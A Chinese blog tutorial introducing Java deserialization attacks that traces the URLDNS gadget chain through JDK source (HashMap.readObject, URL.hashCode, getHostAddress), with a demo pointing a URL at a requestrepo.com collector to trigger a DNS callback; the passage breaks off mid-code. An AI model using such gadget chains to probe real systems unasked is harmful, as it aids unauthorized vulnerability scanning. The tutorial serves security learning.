

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/III.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Zer0">
  <meta name="keywords" content="">
  
    <meta name="description" content="JAVA反序列化入门URLDNS这个链子可以用来判断是否有反序列化漏洞，并没有环境依赖，其本身没有什么攻击性，就是进行一次DNS请求。 原理java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出">
<meta property="og:type" content="article">
<meta property="og:title" content="java入门反序列化">
<meta property="og:url" content="https://eznp.github.io/2025/07/22/java%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Zer0">
<meta property="og:description" content="JAVA反序列化入门URLDNS这个链子可以用来判断是否有反序列化漏洞，并没有环境依赖，其本身没有什么攻击性，就是进行一次DNS请求。 原理java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736401.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736475.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736312.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507172035522.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507172046577.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507172050648.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507181458136.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507181529127.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507181801798.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507182120590.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507212001946.png">
<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507221056608.png">
<meta property="article:published_time" content="2025-07-22T03:43:44.000Z">
<meta property="article:modified_time" content="2025-07-22T03:45:15.350Z">
<meta property="article:author" content="Zer0">
<meta property="article:tag" content="-java安全 -java入门反序列化">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736401.png">
  
  
  
  <title>java入门反序列化 - Zer0</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"eznp.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="Zer0" type="application/atom+xml">
</head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Zer0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/P.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="java入门反序列化"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-07-22 11:43" pubdate>
          2025年7月22日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          79 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">java入门反序列化</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="JAVA反序列化入门"><a href="#JAVA反序列化入门" class="headerlink" title="JAVA反序列化入门"></a>JAVA反序列化入门</h1><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>这个链子可以用来判断是否有反序列化漏洞，并没有环境依赖，其本身没有什么攻击性，就是进行一次DNS请求。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p>
<h3 id="hashcode-方法"><a href="#hashcode-方法" class="headerlink" title="hashcode()方法"></a><code>hashcode()</code>方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">urldns</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, String&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;https://nf2p2x19.requestrepo.com/&quot;</span>);<br>        url.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>跟进看一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>) <span class="hljs-comment">//判断hashCode是否为-1，hashCode是一个私有变量，只有是-1时才能执行hashCode函数</span><br>        <span class="hljs-keyword">return</span> hashCode;<br><br>    hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调式的时候是这样的</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736401.png" srcset="/img/loading.gif" lazyload alt="image-20250428212916412"></p>
<p>继续跟进<code>hashCode()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Generate the protocol part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// Generate the host part.</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u); <span class="hljs-comment">//调用了getHostAddress()函数</span><br>        <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>            h += addr.hashCode();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>            <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>                h += host.toLowerCase().hashCode();<br>        &#125;<br><br>        <span class="hljs-comment">// Generate the file part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>        <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>            h += file.hashCode();<br><br>        <span class="hljs-comment">// Generate the port part.</span><br>        <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>            h += getDefaultPort();<br>        <span class="hljs-keyword">else</span><br>            h += u.getPort();<br><br>        <span class="hljs-comment">// Generate the ref part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>        <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>            h += ref.hashCode();<br><br>        <span class="hljs-keyword">return</span> h;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>调试的时候是这样</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736475.png" srcset="/img/loading.gif" lazyload alt="image-20250428213030039"></p>
<p>我们继续跟进<code>getHostAddress()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                u.hostAddress = InetAddress.getByName(host); <span class="hljs-comment">//这里进行DNS请求</span><br>            &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>跟进<code>InetAddress.getByName(host)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InetAddress <span class="hljs-title function_">getByName</span><span class="hljs-params">(String host)</span><br>    <span class="hljs-keyword">throws</span> UnknownHostException &#123;<br>    <span class="hljs-keyword">return</span> InetAddress.getAllByName(host)[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>hashcode()</code>就是这样子啦~</p>
<h3 id="hashmap类"><a href="#hashmap类" class="headerlink" title="hashmap类"></a><code>hashmap</code>类</h3><p>进去看一下，找到反序列化的函数<code>readobject</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>这里是调用了<code>hash</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure>

<p>跟进<code>hash</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后如果key不为空，则调用了<code>hashcode</code>，这个key是我们传入的url对象，继续跟进url类的<code>hashcode</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//synchronized 关键字修饰的方法为同步方法。当synchronized方法执行完或发生异常时，会自动释放锁。</span><br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>如果hashcode是-1，那么就会执行<code>hashCode = handler.hashCode(this);</code></p>
<p>继续跟进<code>handler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The URLStreamHandler for this URL.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">transient</span> URLStreamHandler handler; <span class="hljs-comment">// transient 关键字，修饰Java序列化对象时，不需要序列化的属性</span><br></code></pre></td></tr></table></figure>

<p>那么跟进<code>URLStreamHandler</code>的<code>hashcode</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Generate the protocol part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// Generate the host part.</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>        <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>            h += addr.hashCode();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>            <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>                h += 